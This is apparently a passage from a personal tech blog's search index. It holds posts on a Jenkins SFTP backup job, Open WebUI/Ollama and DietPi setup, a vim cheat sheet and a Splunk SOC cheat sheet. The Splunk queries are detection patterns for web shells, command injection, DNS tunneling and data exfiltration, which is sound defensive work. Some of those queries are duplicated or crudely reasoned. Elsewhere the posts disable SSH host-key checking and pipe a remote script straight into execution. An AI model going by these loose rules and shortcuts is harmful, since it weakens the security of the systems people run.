Dashboard &gt; New Item.  Select Free-Style Project, name it as Backup SFTP and Click OK.3️⃣ Configure the Build Steps  Triggers Poll SCM H/3 * * * * the cron will schedule to run the job everyday at 3:00 AM  Environment SSH Agent and select the credentials  Scroll to Build section and select the Execute shell and paste the script as this script is self explanatory it will send the notification to discord thread once the file synchronization is completed  Please change the credentials, IP and username accordinglysend_notification() {    local start=\"$1\"    local end=\"$2\"    local info=\"$3\"    # Escape special characters in the info string    escaped_info=$(echo \"$info\" | sed 's/\"/\\\\\"/g' | sed ':a;N;$!ba;s/\\n/\\\\n/g')    curl -H \"Content-Type: application/json\" -X POST -d '{        \"embeds\": [            {                \"color\": 966115,                \"description\": \"👨‍💻  **__Jenkins_Dietpi_Backup__** 🚀 \\n\\n **⏱️ Execution Time:** '\"$start\"' \\n\\n **️ 📝  [Access LOGS from here](https://yunohost.home.lab/jenkins/job/Dotfiles%20Auto/'\"$BUILD_NUMBER\"'/console)**\"            }        ]    }' \"https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"}############################################# Updating the server###########################################start=$(timedatectl | grep Local | awk '{print $5,$6}')rsync -avz --progress -e \"ssh -o StrictHostKeyChecking=no\" /var/backups/jenkins/ $USER@$iP:/REMOTE/LOCATION/# Sending the notification send_notification \"$start\"Save the configuration.🌟 Best Practices  Regularly test your backups by restoring them on a test environment.  Use an external storage location (e.g., cloud or network drive or Remote server) for added security.  Monitor disk space usage in your backup location to avoid failures.By following this guide, you can ensure that your Jenkins configurations and data are backed up periodically, safeguarding against potential data loss or system failures."
  },
  
  {
    "title": "Open WebUI & Ollama setup on Windows",
    "url": "/posts/ollama/",
    "categories": "Windows",
    "tags": "docker, ollama, open-webui",
    "date": "2025-02-04 00:00:00 +0530",
    





    
    "snippet": "🌐 What is Open WebUI?Open WebUI is an open-source, web-based user interface designed to simplify interactions with backend applications. It provides a sleek interface for handling modules, pulling ...",
    "content": "🌐 What is Open WebUI?Open WebUI is an open-source, web-based user interface designed to simplify interactions with backend applications. It provides a sleek interface for handling modules, pulling resources, and managing tasks efficiently.🖥️ System RequirementsTo install and use Open WebUI and Ollama on Windows, ensure your system meets the following requirements:  Operating System: Windows 10/11 (64-bit)  RAM: Minimum 8GB (16GB recommended)  Processor: x64-based processor  Storage: At least 20GB of free space  Software: Docker Desktop, Winget, or Chocolatey (for package management)1️⃣ Install OllamaOllama is a prerequisite for running Open WebUI. Follow these steps to install it on Windows:  Visit the official Ollama website and download the installer for Windows.  Run the installer and follow the on-screen instructions to complete the installation.  Verify the installation by opening a terminal and typing:    ollama --version          If the version number appears, Ollama has been installed successfully.2️⃣ Install Open WebUI using pythoninstall using pythonOpen the terminal as administrator and install the python  Open a terminal and install Docker Desktop using Winget:    winget install Python.Python.3.10        Alternatively, use Chocolatey:    choco install python --version=3.10        Once installed, launch terminal and ensure it is running. Verify by typing:    python --version          Default Model DirectoryBy default, Ollama stores models in the following directory: C:\\Users\\%username%\\.ollama\\modelsSteps to Change the Model Directory if neededFollow these steps to change the model directory:            Quit Ollama: Ensure that the Ollama application is not running. You can do this by right-clicking the Ollama icon in the taskbar and selecting ‘Quit’.                  Open Environment Variables:                  For Windows 11, open the Settings app and search for “environment variables”.          For Windows 10, open the Control Panel and search for “environment variables”.                                Edit Environment Variables: Click on “Edit environment variables for your account”.                  Set the OLLAMA_MODELS Variable:                          If the variable already exists, select it and click “Edit”. If it does not exist, click “New” to create it.          Set the variable name to OLLAMA_MODELS and the value to your desired directory path (e.g., D:\\OllamaModels).                                Save Changes: Click OK/Apply to save your changes.                  Restart Ollama: Launch the Ollama application from the Start menu to apply the new settings.        Reboot the system to update the environment variablesinstalling open webui using python uvxuvx is a command-line tool designed to manage Python environments and run Python applications easily. It simplifies version management, package installation, and application execution, especially for Python-based projects like OpenWebUI.   powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"   $env:DATA_DIR=\"D:\\owui\\data\"; uvx --python 3.11 open-webui@latest serve Open your browser and navigate to http://localhost:8080 to access the Open WebUI interface.install using DockerConfiguring Open WebUI with DockerAs my system has s dedicated server so am using the GPU webui if you dont have a GPU you can exclude it check the official ollama quick start guideCreate a docker-compose.yml file with the following configuration:services:  open-webui:    image: ghcr.io/open-webui/open-webui:cuda    container_name: open-webui    ports:      - \"3000:8080\"    deploy:      resources:        reservations:          devices:            - capabilities: [\"gpu\"]    volumes:      - open-webui:/app/backend/data    restart: unless-stopped    extra_hosts:            - 'host.docker.internal:host-gateway'volumes:  open-webui:    driver: localKey Configuration Breakdown:  Image: Specifies the container image from the Open WebUI GitHub Container Registry.  Restart: Ensures the container automatically restarts on failure or reboot.  Volumes: Maps a directory for persistent data storage.  Extra Hosts: Links the container to the host system for seamless communication.  Ports: Maps the internal port 8080 to the external port 3000 for web access.Running the Docker Container  Navigate to the directory containing the docker-compose.yml file.  Run the following command to start the Open WebUI container:    docker-compose up -d        Verify the container is running:    docker ps      3️⃣ Sign In to Open WebUI  Open the browser and go to http://localhost:8080  Create an account or log in using your existing credentials.4️⃣ Pull the ModulesOnce signed in, navigate to the “Admin panel &gt; settings &gt; Modules” section in Open WebUI and:pulling the module via openwebui  Select the module you wish to install.  Click “Pull” to download and install the module. Ensure your internet connection is stable for smooth downloads.5️⃣ Select the Module and Enjoy the ChatAfter the modules are installed:  Go to the “Chat” section.  Select your preferred module from the dropdown.  Start chatting and exploring the capabilities of Open WebUI!🚀 ConclusionBy following this guide, you should now have a fully functional Open WebUI and Ollama setup on your Windows machine. With this setup, you can effortlessly manage modules, interact with backend data, and enjoy the streamlined user interface Open WebUI offers."
  },
  
  {
    "title": "DietPi Headless webmin Setup",
    "url": "/posts/dietpi/",
    "categories": "Linux",
    "tags": "DietPi, Linux, Raspberry Pi, Lightweight OS",
    "date": "2025-01-31 00:00:00 +0530",
    





    
    "snippet": "🍃 What is DietPi?DietPi is a lightweight and optimized Debian-based operating system specifically designed for single-board computers like Raspberry Pi, as well as other low-powered devices. It foc...",
    "content": "🍃 What is DietPi?DietPi is a lightweight and optimized Debian-based operating system specifically designed for single-board computers like Raspberry Pi, as well as other low-powered devices. It focuses on providing a minimal yet highly configurable environment for users who want performance and efficiency in their setups.🏆 Key Features of DietPi:  Minimal Footprint: DietPi is one of the lightest operating systems available, with an installation size as small as 400MB.  Highly Optimized: Each installation is tuned to reduce CPU and memory usage, ensuring faster boot times and smoother performance.  User-Friendly Configuration: Comes with the DietPi-Config and DietPi-Software tools, making system and software setup effortless.  Customizability: DietPi allows you to install only the software you need, reducing unnecessary bloat.  Wide Device Support: Works not only on Raspberry Pi but also on devices like Odroid, Pine64, and virtual machines.💡 Why Use DietPi?DietPi is a preferred choice for enthusiasts and developers looking for a no-nonsense operating system that prioritizes performance and simplicity. Here’s why you might choose DietPi:  🔧 Performance: Its lightweight nature ensures maximum efficiency, making it ideal for low-powered devices or applications requiring optimal resource management.  📦 Simplified Software Installation: DietPi includes a software catalog (DietPi-Software) that allows you to install popular tools and applications like Docker, Pi-hole, Home Assistant, and more with just a few clicks.  🖥️ Versatility: Whether you’re setting up a media server, lightweight desktop, or even a headless system, DietPi provides the flexibility to meet your needs.  🌍 Community and Support: DietPi has an active community and excellent documentation, making troubleshooting and learning easier for users of all levels.🔥 Interesting Points About DietPi  Energy Efficient: Consumes less power than most other Raspberry Pi operating systems, making it ideal for 24/7 use cases like servers or IoT devices.  Automated Backups: DietPi includes tools for automated backups, ensuring data safety during system upgrades or failures.  Built-In Benchmarks: Includes benchmarking tools to test CPU and memory performance.  Headless Configuration: Perfect for headless setups, allowing you to control and configure the system remotely.  Pre-Configured Software Options: Offers streamlined options for web servers, file sharing, VPNs, and more.  Lightweight Desktop Environments: If needed, you can install LXDE, XFCE, or MATE for a lightweight graphical interface.🛠️ Use Cases for DietPi  Home Server: Set up file sharing, media servers (Plex/Emby), or Nextcloud.  Ad Blocking: Use Pi-hole for network-wide ad blocking.  IoT Projects: Build efficient and resource-light IoT systems.  Development Environment: Install Docker, Node.js, or LAMP stacks for lightweight development.  Network Tools: Configure VPNs or network monitoring tools with ease.🌐 Download and Install DietPiYou can download the DietPi operating system directly from the official website:👉 Download DietPiSteps to Install DietPi:1. Download the Image:Visit the DietPi download page and select your device.2. Flash the Image:Use tools like Rufus, Balena Etcher, or Raspberry Pi Imager to write the DietPi image to an SD card or USB drive.For this process, I am using Rufus to flash the DietPi image to the SD card.Steps:  Download Rufus: Go to the Rufus website and download the tool.  Insert SD Card or USB Drive: Plug in your SD card or USB drive into your computer.  Select the DietPi Image: Open Rufus and select the DietPi image you want to flash.  Start Flashing: Click on ‘Start’ to write the DietPi image onto your SD card or USB drive.Once the image is written, follow the next steps to configure your network settings.  Update Network Configuration:          Open the dietpi.txt file in your favorite text editor.      Update the network settings based on your preferences. In this example, I am using a Class A network at home and updated accordingly.      ##### Network options ###### Enable Ethernet or WiFi adapter: 1=enable | 0=disable# - If both Ethernet and WiFi are enabled, WiFi will take priority and Ethernet will be disabled.# - If using WiFi, please edit dietpi-wifi.txt to pre-enter credentials.AUTO_SETUP_NET_ETHERNET_ENABLED=1AUTO_SETUP_NET_WIFI_ENABLED=1AUTO_SETUP_NET_WIFI_SSID=mujuAUTO_SETUP_NET_WIFI_KEY=XXXXXXXXXX# WiFi country code: 2 capital letter value (e.g. GB US DE JP): https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2# - NB: This choice may be overridden if the WiFi access point sends a country code.AUTO_SETUP_NET_WIFI_COUNTRY_CODE=GB# Enter your static network details below, if applicable.AUTO_SETUP_NET_USESTATIC=0AUTO_SETUP_NET_STATIC_IP=XX.XX.XX.XXAUTO_SETUP_NET_STATIC_MASK=XXX.XXX.XXX.oAUTO_SETUP_NET_STATIC_GATEWAY=XX.XX.XX.XXAUTO_SETUP_NET_STATIC_DNS=8.8.8.8 9.9.9.9   Modify Wi-Fi Configuration: Open the dietpi-wifi.txt file and modify the Wi-Fi settings.aWIFI_SSID[0]='muju'aWIFI_KEY[0]='XXXXXXXXXX'  Save Changes: Save the changes you made to the dietpi.txt and dietpi-wifi.txt files.3. Boot Your Device:Insert the SD card/USB into your device and boot it up. Wait for DietPi to complete some initial setup steps. Follow the on-screen prompts to configure your DietPi installation.4. Customize Your Setup:DietPi also comes pre-installed with Dropbear SSH Server.username = rootpassword = dietpiUse dietpi-software to install additional applications as per your needs.1. Login to the Server via SSH  Log in to your DietPi server using SSH:    ssh root@&lt;your-server-ip&gt;        Once logged in, execute the following to start installing applications:    dietpi-software      2. Search for Webmin Package  After running dietpi-software, search for the Webmin package by typing its name.  Webmin allows you to control the server via a web interface over HTTPS.                               3. Select Webmin Package for Installation  Select the package named webmin: web interface system management.  Proceed with the installation by following the on-screen prompts.  You can explore the software options for DietPi by visiting the official site DietPi software documentation. This page provides an extensive list of applications that can be easily installed and configured on your DietPi system                                            4. Access Webmin  Once the installation is completed, you can access Webmin via HTTPS: https://&lt;your-server-ip&gt;:10000  Log in with the user credentials you created during the initial server setup.🚀 ConclusionDietPi stands out as a powerful and lightweight Linux operating system for Raspberry Pi and other low-powered devices. With its minimal design, ease of use, and robust performance, it’s an excellent choice for hobbyists and professionals alike. Whether you’re building a home server, IoT project, or just exploring Linux, DietPi offers the tools and flexibility to bring your vision to life."
  },
  
  {
    "title": "vim",
    "url": "/posts/vim/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-30 00:00:00 +0530",
    





    
    "snippet": "Vim Cheat Sheet📍 Basic Cursor Movements            Command      Action      Description                  k      Move up      Moves the cursor one line up.              j      Move down      Moves t...",
    "content": "Vim Cheat Sheet📍 Basic Cursor Movements            Command      Action      Description                  k      Move up      Moves the cursor one line up.              j      Move down      Moves the cursor one line down.              h      Move left      Moves the cursor one character to the left.              l      Move right      Moves the cursor one character to the right.              e      Jump to word end      Moves the cursor to the end of the current or next word.              b      Jump to word start      Moves the cursor to the beginning of the current or previous word.              $      Jump to line end      Moves the cursor to the end of the current line.              0      Jump to line start      Moves the cursor to the beginning of the current line.              H      Move to top of screen      Moves the cursor to the first visible line on the screen.              M      Move to middle of screen      Moves the cursor to the middle visible line on the screen.              L      Move to bottom of screen      Moves the cursor to the last visible line on the screen.              w      Jump to next word start      Moves the cursor to the beginning of the next word.      ✏️ Editing Basics            Command      Action      Description                  i      Insert mode      Enters insert mode to type at the current cursor position.              I      Insert at start of line      Enters insert mode at the beginning of the current line.              a      Append mode      Enters insert mode to type after the current cursor position.              A      Append to line end      Enters insert mode at the end of the current line.              o      Insert new line below      Creates a new line below the current line and enters insert mode.              O      Insert new line above      Creates a new line above the current line and enters insert mode.              r      Replace single character      Replaces the character under the cursor with the next typed character.              R      Replace mode      Enters overwrite mode to replace multiple characters.              esc      Exit insert mode      Exits insert or replace mode and returns to normal mode.      🚀 Advanced Cursor Navigation            Command      Action      Description                  fw      Search next w      Moves the cursor to the next occurrence of the character w on the current line.              Fw      Search previous w      Moves the cursor to the previous occurrence of the character w.              tw      Jump before next w      Moves the cursor just before the next occurrence of w on the line.              Tw      Jump before previous w      Moves the cursor just before the previous occurrence of w.              ;      Repeat last search      Repeats the last f, F, t, or T command.              ,      Reverse last search      Repeats the last f, F, t, or T command in the opposite direction.              5j      Move down 5 lines      Moves the cursor 5 lines down.              5k      Move up 5 lines      Moves the cursor 5 lines up.      ✂️ Advanced Text Editing            Command      Action      Description                  yy      Yank line      Copies the entire current line.              y$      Yank to line end      Copies from the cursor position to the end of the line.              ye      Yank to word end      Copies from the cursor position to the end of the word.              dd      Delete current line      Deletes the entire current line.              5dd      Delete 5 lines      Deletes the next 5 lines starting from the current line.              d2w      Delete 2 words      Deletes the next two words starting from the cursor position.              D      Delete to line end      Deletes from the current cursor position to the end of the line.              p      Paste below      Pastes the yanked or deleted content after the current line.              P      Paste above      Pastes the yanked or deleted content before the current line.      ✂️ Vim Editing Shortcuts ⌨            Shortcut      Action                  P      Paste before cursor              u      Undo              U      Undo all changes to current line              ^r      Redo              .      Repeat last change              5.      Repeat last change 5 times              de      Delete (cut) to end of word              d$      Delete (cut) to end of line      🔄 Vim Navigation Shortcuts            Shortcut      Action                  ^      Move to first non-whitespace char              20|      Go to column 20              %      Go to matching parenthesis or bracket              ^o      Move to older position              ^i      Move to newer position              zt      Scroll current line to top of window      ✍️ Vim Editing Commands            Shortcut      Action                  :w filename      Write selection to ‘filename’              v      Visual mode select characters              V      Visual mode highlight lines              `      Swap case              &gt;      Shift right              &lt;      Shift left              c      Change highlighted text              y      Yank (copy) highlighted text              d      Cut highlighted text              =      Re-indent selection      🖥️ Vim Window Management Shortcuts            Shortcut      Action                  :e filename      Set current buffer to ‘filename’              :sp      New window above              :vs      New window to left              :q      Close current window              :qa      Close all windows      💾 Vim Save &amp; File Operations            Shortcut      Action                  :q!      Quit without saving              :wq      Save and exit              :x      Save and exit if modified              :r filename      Read and insert ‘filename’              :r !cmd      Execute and insert results of ‘cmd’              :!rm filename      Delete ‘filename’              :e      Open new file              ^g      Show file info              ga      Show character info              :w      Save changes              :q      Quit      📍 Vim Bookmarks &amp; Position Navigation            Shortcut      Action                  :marks      Show bookmarks              ma      Mark position ‘a’              `a      Go to bookmark position ‘a’              ``      Go to previous position      🔍 Vim Search &amp; Replace Shortcuts            Shortcut      Action                  :s/foo/bar      Replace first ‘foo’ with ‘bar’ on line              :s/foo/bar/g      Replace all ‘foo’ with ‘bar’ on line              :%s/foo/bar/g      Replace all ‘foo’ with ‘bar’ in file              :%s/foo/bar      Replace first ‘foo’ with ‘bar’ on every line              :s/foo/bar/gc      Confirm replace all ‘foo’ with ‘bar’ on line              :s/foo/bar/i      Ignore case replace first ‘foo’ with ‘bar’              rx      Replace current char with ‘x’              :%s/foo/bar/gc      Confirm replace all ‘foo’ with ‘bar’ in file              :2,9s/foo/bar/g      Replace all ‘foo’ with ‘bar’ between lines 2 and 9      🔎 Vim Search Commands &amp; Options            Shortcut      Action                  /foo      Search forwards for ‘foo’              ?foo      Search backwards for ‘foo’              n      Search next              N      Search previous              *      Search for current word forward              :set nois      Turn off incremental search              :set ic      Set ignore case              :set is      Set incremental search              :set hls      Set highlight matching phrases      🖥️ Vim Command Execution &amp; Autocomplete Shortcuts            Shortcut      Action                  vim -t foo      Start editing where ‘foo’ is defined              :help cmd      Lookup ‘cmd’ in help              :make      Run make              :!ls      Execute ‘ls’ command              ^p      Move autocomplete backward              ^x      Move language autocomplete forward              ^o      Move language autocomplete backward              K      Look up word in man pages              yw      Yank to beginning of next word      "
  },
  
  {
    "title": "splunk",
    "url": "/posts/splunk/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-30 00:00:00 +0530",
    





    
    "snippet": "Splunk Queries for SOC Analyst🔍 Advanced Splunk Queries for Security MonitoringAs a System Engineer, monitoring security events is critical for ensuring system integrity and identifying potential t...",
    "content": "Splunk Queries for SOC Analyst🔍 Advanced Splunk Queries for Security MonitoringAs a System Engineer, monitoring security events is critical for ensuring system integrity and identifying potential threats. Here’s a collection of essential Splunk queries categorized for different scenarios, from failed login attempts to suspicious network traffic.🔐 Authentication Attempts🔐 Failed Login Attemptssourcetype=auth* \"authentication failure\"| stats count by user| sort -count🔑 Failed SSH Attemptssourcetype=linux_secure \"Failed password for\"| stats count by src_ip| sort -count✅ Successful SSH Attemptssourcetype=linux_secure \"Accepted publickey for\"| stats count by src_ip| sort -count🌎 Successful Login Attempts from New or Unknown IP Addressessourcetype=access_* action=login| stats count by user, src_ip| where count=1🔓 Account Takeover Attemptssourcetype=access_* action=login| stats count by user| where count &gt; 10🛠️ Brute Force Attacks on SSH Serverssourcetype=linux_secure action=invalid| stats count by src_ip| where count &gt;= 10📧 Brute Force Attacks on Email Accountssourcetype=exchangeps| stats count by src_ip| where count &gt;= 10🔐 Brute Force Attacks on SSH Serverssourcetype=access_* method=POST uri_path=\"*/ssh\"| stats count by src_ip| where count &gt;= 10🔐 Brute Force Attacks on SSH Servers (Failed Login Attempts)sourcetype=linux_secure action=failed| stats count by src_ip| where count &gt;= 10🛠️ Brute Force Attacks on MSSQL Serverssourcetype=mssql_access action=failed| stats count by src_ip| where count &gt;= 10🛠️ Brute Force Attacks on RDPsourcetype=WinEventLog:Security EventCode=4625| search Logon_Type=10 AND Status=\"0xC000006D\"🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=WinEventLog:Security EventCode=4697 OR EventCode=7045| search Image_Path=\"*\\\\System32\\\\*\" AND NOT User=\"SYSTEM\"➡️ Lateral Movement Attempts Using Remote Registrysourcetype=WinEventLog:Security EventCode=4663| search Object_Name=\"*\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\" AND NOT User=\"SYSTEM\" ANDNOT User=\"NETWORK SERVICE\" AND NOT User=\"LOCAL SERVICE\"➡️ Lateral Movement Attempts Using SMBsourcetype=WinEventLog:Security EventCode=5140| search Object_Name=\"*\\\\ADMIN$\" OR Object_Name=\"*\\\\C$\"➡️ Lateral Movement Attempts Using SMB (Successful Logins)sourcetype=WinEventLog:Security EventCode=5140| search Object_Name=\"*\\\\ADMIN$\" OR Object_Name=\"*\\\\C$\"➡️ Lateral Movement Attempts Using RDP (Successful Logins)sourcetype=WinEventLog:Security EventCode=4624| search Logon_Type=10🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=WinEventLog:Security EventCode=4698| search \"Task Scheduler service found a misconfiguration\" AND NOT User=\"SYSTEM\"🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=\"WinEventLog:Security\" EventCode=4672| eval user_account=mvindex(Account_Name,1)| search \"Security ID\" NOT IN (\"SYSTEM\",\"LOCAL SERVICE\",\"NETWORK SERVICE\")⚙️ Privilege Escalation Attempts Using PowerShellsourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=400| search \"PowerShell pipeline execution details\" AND NOT \"UserPrincipalName=SYSTEM@*\"AND NOT \"UserPrincipalName=NETWORK SERVICE@*\"✉️ Phishing Attempts Through Email Attachmentssourcetype=email| search attachment=\"*.exe\" OR attachment=\"*.zip\"🛡️ Security Threats🛡️ Security Threatssourcetype=access_* method=POST status=200 |rex field=_raw \"password=(?&lt;password&gt;[^&amp;]+)\"| eval password_length=length(password)| where password_length &gt;= 8🚨 Traffic to Known Malicious IP Addressessourcetype=network_traffic dest_ip=malicious_ip🦠 Malware Infectionssourcetype=access_* action=file_download |rex field=file_path \".*\\.(?&lt;extension&gt;[^\\.]+)\"| search extension=\"exe\" OR extension=\"dll\"👀 Insider Threatssourcetype=access_* action=file_upload| stats count by user, file_path| where count &gt; 10🛡️ Ransomware Activity\"sourcetype=access_* action=file_write  | search file_path=\"*.crypt\" OR file_path=\"*.locky\"\"🛡️ Ransomware Activitysourcetype=access_* action=file_delete| rex field=file_path \".*\\\\.(?&lt;extension&gt;[^\\\\.]+)\"| search extension=\"encrypted\" OR extension=\"locked\" OR extension=\"ransom\"💻 Web Shell Activity\"sourcetype=access_* action=command_execution  | search (echo|print|printf)\\s+(base64_decode|eval|gzinflate|str_rot13)\"⚔️ DDoS Attackssourcetype=network_traffic| stats sum(bytes) as total_bytes by src_ip| where total_bytes &gt; 100000000🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=WinEventLog:Security EventCode=4688| search (New_Process_Name=\"*\\\\runas.exe\" OR New_Process_Name=\"*\\\\psexec.exe\") ANDNOT User=\"SYSTEM\"🌏 Successful SSH Logins from Unusual Countriessourcetype=access_* action=login service=ssh| iplocation src_ip| stats count by src_country| where count &gt; 10 AND NOT src_country=\"United States\"🖥️ Ransomware Activity on Windows Systemssourcetype=WinEventLog:Security EventCode=4663 |rex field=Object_Name \"\\\\\\\\.*\\\\\\\\(?&lt;filename&gt;.+)\"| rex field=filename \".*\\\\.(?&lt;extension&gt;[^\\\\.]+)\"| search extension=\"encrypted\" OR extension=\"locked\" OR extension=\"ransom\"🚨 Suspicious Activity🚨 Privilege Escalation Attemptssourcetype=linux_secure su*| where user!=root AND user!=\"\"🌐 Unusual Network Trafficsourcetype=network_traffic| stats sum(bytes) as total_bytes by src_ip, dest_ip| where total_bytes &gt; 1000000🕵️ Suspicious Processessourcetype=processes| search \"lsass.exe\" OR \"svchost.exe\" OR \"explorer.exe\"| stats count by user| sort -count🛠️ Brute Force Attackssourcetype=access_* | stats count by clientip, action | where action=\"failure\" AND count&gt;=5📡 Network Port Scanssourcetype=network_traffic| stats count by src_ip, dest_port| where count &gt; 100🕒 Unusual Login Timessourcetype=access_* action=login| eval hour=strftime(_time,\"%H\")| stats count by user, hour| where count &lt; 3👀 Reconnaissance Activity\"sourcetype=access_* method=GET  | stats count by uri_path  | where count &gt; 100\"🔐 Privilege Escalation Attempts\"sourcetype=access_* action=privilege_escalation  | stats count by user  | where count &gt; 5\"✉️ Phishing Attempts Through Email Attachmentssourcetype=email| search attachment=\"*.exe\" OR attachment=\"*.zip\"📁 Brute Force Attacks on a Specific Applicationsourcetype=access_* uri_path=\"/app/login\" AND action=failure| stats count by src_ip| where count &gt;= 5📂 Unauthorized Changes to Critical Files\"sourcetype=access_* action=file_write  | search file_path=\"*/etc/*\" OR file_path=\"*/var/*\"\"📡 Command and Control (C2) Traffic\"sourcetype=network_traffic  | stats count by dest_ip  | where count &gt; 500 AND NOT dest_ip IN (192.168.0.0/16, 10.0.0.0/8)\"🌍 Malicious Traffic from a Specific IP Address\"sourcetype=network_traffic src_ip=10.1.1.1  | stats count by dest_ip  | where count &gt; 10\"🌏 Successful SSH Logins from Unusual Countriessourcetype=access_* action=login service=ssh| iplocation src_ip| stats count by src_country| where count &gt; 10 AND NOT src_country=\"United States\"🐧 Privilege Escalation Attempts on Linux Systemssourcetype=linux_secure \"sudo:\" |where user!=\"root\" AND user!=\"\"🛠️ Brute Force and Exploit Attempts🛠️ Brute Force Attackssourcetype=access_* | stats count by clientip, action | where action=\"failure\" AND count&gt;=5👤 Abnormal User Activitysourcetype=access_* action=purchase| stats count by clientip, user| where count &gt; 50🌍 DNS Tunneling Activitysourcetype=dns| rex field=answer \"data\\\"\\s*:\\s*\\\"(?&lt;data&gt;[^\\\"]+)\\\"\"| eval data_length=len(data)| where data_length &gt; 32 AND (data_length % 4) == 0⚙️ Suspicious PowerShell Activitysourcetype=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4103| eval script_block=mvindex(Message,3)| search script_block=\"*Start-Process*\"📂 Unusual File Accesssourcetype=access_* action=file_delete OR action=file_rename| stats count by user| where count &gt; 10📁 Brute Force Attacks on Web Applicationssourcetype=access_* method=POST uri_path=\"*.php\"| stats count by src_ip| where count &gt;= 50📩 Spear-Phishing Attemptssourcetype=email| search \"CEO\" OR \"CFO\" OR \"Finance\" OR \"Accounting\" OR \"Payment\"⚙️ Privilege Escalation Attempts Using PowerShellsourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=400| search \"PowerShell pipeline execution details\" AND NOT \"UserPrincipalName=SYSTEM@*\"AND NOT \"UserPrincipalName=NETWORK SERVICE@*\"🐧 Privilege Escalation Attempts on Linux Systems\"sourcetype=access_* action=\"sudo command\"  | stats count by user  | where count &gt;= 10\"🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=WinEventLog:Security EventCode=4688| search (New_Process_Name=\"*\\\\runas.exe\" OR New_Process_Name=\"*\\\\psexec.exe\") ANDNOT User=\"SYSTEM\"📧 Phishing Attackssourcetype=access_* method=POST uri_path=\"*.php\"| search form_action=\"http://www.evilsite.com/login.php\" AND (input_password=* ORinput_password=*)🌐 Network &amp; DNS Activity🕒 Unusual Login Timessourcetype=access_* action=login| eval hour=strftime(_time,\"%H\")| stats count by user, hour| where count &lt; 3🌐 Unusual DNS Requestssourcetype=dns |stats count by query| where count &gt; 10🛠️ Brute Force Attacks on a Specific Protocolsourcetype=network_traffic protocol=http| stats count by src_ip| where count &gt;= 50👥 Brute Force Attacks Against a Specific Usersourcetype=access_* user=username AND action=failure| stats count by src_ip| where count &gt;= 5👀 Reconnaissance Activity\"sourcetype=access_* method=GET  | stats count by uri_path  | where count &gt; 100\"🛡️ Ransomware Activitysourcetype=access_* action=file_delete| rex field=file_path \".*\\\\.(?&lt;extension&gt;[^\\\\.]+)\"| search extension=\"encrypted\" OR extension=\"locked\" OR extension=\"ransom\"🌍 DNS Tunneling Activitysourcetype=dns| stats count by query| where count &gt; 5 AND NOT match(query, \"\\\\.\")⚒️ Command Injection Attempts on Web Serverssourcetype=access_* method=POST uri_path=\"*.php\"| rex field=_raw \"(?&lt;command&gt;cat|ls|dir)\\s+(?&lt;argument&gt;[^;]+)\"| where isnotnull(command) AND isnotnull(argument)📤 Data Exfiltration Attempts Over HTTPSsourcetype=ssl method=POST| stats count by src_ip, dest_ip| where count &gt;= 10📂 File Activity📁 Unusual File Extensionssourcetype=access_* action=file_upload| rex field=file_path \".*\\.(?&lt;extension&gt;[^\\.]+)\"| stats count by extension| where count &gt; 10📂 Unusual File Accesssourcetype=access_* action=file_delete OR action=file_rename| stats count by user| where count &gt; 10📂 Unauthorized Changes to Critical Files\"sourcetype=access_* action=file_write  | search file_path=\"*/etc/*\" OR file_path=\"*/var/*\"\"⚒️ Command Injection Attempts on Web Serverssourcetype=access_* method=POST uri_path=\"*.php\"| rex field=_raw \"(?&lt;command&gt;cat|ls|dir)\\s+(?&lt;argument&gt;[^;]+)\"| where isnotnull(command) AND isnotnull(argument)➡️ Lateral Movement Attempts Using SMB (Successful Logins)sourcetype=WinEventLog:Security EventCode=5140| search Object_Name=\"*\\\\ADMIN$\" OR Object_Name=\"*\\\\C$\"Data Exfiltration📤 Data Exfiltrationsource type=access_* action=file_download| stats count by user, dest_ip, dest_port| where count &gt; 10📤 Data Exfiltration Attempts Over HTTPsourcetype=access_* action=file_download| search uri_path=\"*.zip\" OR uri_path=\"*.rar\" OR uri_path=\"*.tgz\" OR uri_path=\"*.tar.gz\"📤 Data Exfiltration Attempts Over HTTPSsourcetype=ssl method=POST| stats count by src_ip, dest_ip| where count &gt;= 10📤 Data Exfiltration Attempts Over FTPsourcetype=access_* action=file_upload| search uri_path=\"*/ftp\" OR uri_path=\"*/sftp\"📤 Data Exfiltration Attempts Over DNSsourcetype=dns| search query_type=A AND query !=\"*.google.com\" AND query !=\"*.facebook.com\" AND query!=\"*.twitter.com\" AND query !=\"*.microsoft.com\"📤 Data Exfiltration Attempts Over SMTPsourcetype=smtp action=send_message| search recipient!=\"*@gmail.com\" AND recipient!=\"*@yahoo.com\" ANDrecipient!=\"*@hotmail.com\" AND recipient!=\"*@aol.com\"📤 Data Exfiltration Attempts Over FTPsourcetype=ftp action=putfile| stats count by src_ip| where count &gt;= 10💻 Web Server Attacks🔐 Privilege Escalation Attempts\"sourcetype=access_* action=privilege_escalation  | stats count by user  | where count &gt; 5\"🛠️ SQL Injection Attempts on Web Serverssourcetype=access_* method=POST uri_path=\"*.php\"| rex field=_raw \"SELECT\\\\s+(?&lt;query&gt;[^;]+)\"| eval query_length=length(query)| where query_length &gt; 50 AND query_length &lt; 100📂 Unauthorized Changes to Critical Files\"sourcetype=access_* action=file_write  | search file_path=\"*/etc/*\" OR file_path=\"*/var/*\"\"🖥️ Privileged System Access🛠️ SQL Injection Attempts on Web Servers\"sourcetype=access_* method=POST uri_path=\"*.php\"  | rex field=_raw \"SELECT\\s+(?&lt;query&gt;[^;]+)\"  | eval query_length=length(query)  | where query_length &gt; 100 AND query_length &lt; 200\"🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=WinEventLog:Security EventCode=4698| search \"Task Scheduler service found a misconfiguration\" AND NOT User=\"SYSTEM\"➡️ Lateral Movement Attempts Using WinRMsourcetype=WinEventLog:Microsoft-Windows-WinRM/Operational EventCode=146| search \"winrs: client\" AND \"is 